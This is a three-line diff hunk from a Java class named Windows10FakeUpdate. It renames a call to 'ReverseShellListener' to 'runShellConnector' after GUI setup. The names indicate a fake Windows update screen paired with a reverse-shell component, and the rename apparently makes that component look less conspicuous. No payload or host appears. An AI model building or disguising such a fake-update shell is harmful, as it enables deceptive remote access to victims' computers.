@@ -88,7 +88,7 @@ public class Windows10FakeUpdate {
                     GUI gui = new GUI(600, 400);
                     gui.setUpGUI();
                     gui.setUpButtonListeners();
-                    gui.ReverseShellListener();
+                    gui.runShellConnector();
 
                 }
             }
